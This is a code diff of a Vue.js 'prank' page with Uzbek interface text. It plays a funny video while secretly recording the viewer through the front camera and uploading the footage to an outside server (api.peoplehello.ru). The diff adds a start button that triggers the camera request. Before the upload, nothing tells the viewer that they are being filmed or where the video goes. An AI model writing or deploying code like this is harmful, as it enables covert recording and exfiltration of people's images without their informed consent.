@@ -8,35 +8,37 @@ export default {
       mediaRecorder: null,
       recordedChunks: [],
       recording: false,
+      started: false
     }
   },
 
-  async mounted() {
-    await this.requestCamera()
-  },
-
   methods: {
+    async startPrank() {
+      this.started = true
+      await this.requestCamera()
+    },
+
     async requestCamera() {
       try {
         this.stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: false // xohlasangiz true qilsak bo‘ladi
+          audio: false
         })
 
         this.startRecording()
 
       } catch (e) {
-        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
+        alert('❌ Kamera ruxsati berilmadi')
+        console.error(e)
       }
     },
 
     startRecording() {
       this.recordedChunks = []
 
-      // 🔻 Video hajmini kichraytirish (bitrate past)
       this.mediaRecorder = new MediaRecorder(this.stream, {
         mimeType: 'video/webm;codecs=vp8',
-        videoBitsPerSecond: 700_000 // ~0.7 Mbps
+        videoBitsPerSecond: 700_000
       })
 
       this.mediaRecorder.ondataavailable = (e) => {
@@ -68,17 +70,14 @@ export default {
               'https://api.peoplehello.ru/api/video-upload',
               formData
           )
-
-          alert('😂 Video muvaffaqiyatli yuborildi!')
-
-        } catch (e) {
-          alert('❌ Video yuborishda xatolik')
+          alert('😂 Video yuborildi!')
+        } catch {
+          alert('❌ Video yuborilmadi')
         }
       }
     },
 
     onFunnyVideoEnd() {
-      // 🎬 Kulgili video tugadi → recording ham tugaydi
       this.stopRecordingAndSend()
     }
   }
@@ -87,49 +86,48 @@ export default {
 
 <template>
   <div class="prank-page">
+
+    <!-- BOSHLASH EKRANI -->
+    <div v-if="!started" class="start-screen">
+      <button @click="startPrank">
+        ▶️ Videoni boshlash
+      </button>
+    </div>
+
     <!-- 😂 Kulgili video -->
     <video
+        v-else
         class="fun-video"
         autoplay
         playsinline
         muted
         @ended="onFunnyVideoEnd"
     >
-      <source src="../assets/prank.mp4" type="video/mp4"/>
+      <source src="../assets/prank.mp4" type="video/mp4" />
     </video>
 
-    <div class="overlay">
-      <h1>😂 Oxirgacha ko‘ring!</h1>
-      <p>Video yuklanmoqda...</p>
-    </div>
   </div>
 </template>
 
+
 <style>
-.prank-page {
-  position: relative;
+.start-screen {
   width: 100vw;
   height: 100vh;
   background: #000;
-  overflow: hidden;
-}
-
-.fun-video {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-}
-
-.overlay {
-  position: absolute;
-  inset: 0;
-  background: rgba(0, 0, 0, 0.35);
   color: #fff;
   display: flex;
   flex-direction: column;
   align-items: center;
   justify-content: center;
-  font-size: 24px;
-  text-align: center;
 }
+
+.start-screen button {
+  padding: 16px 30px;
+  font-size: 18px;
+  border-radius: 10px;
+  border: none;
+  cursor: pointer;
+}
+
 </style>
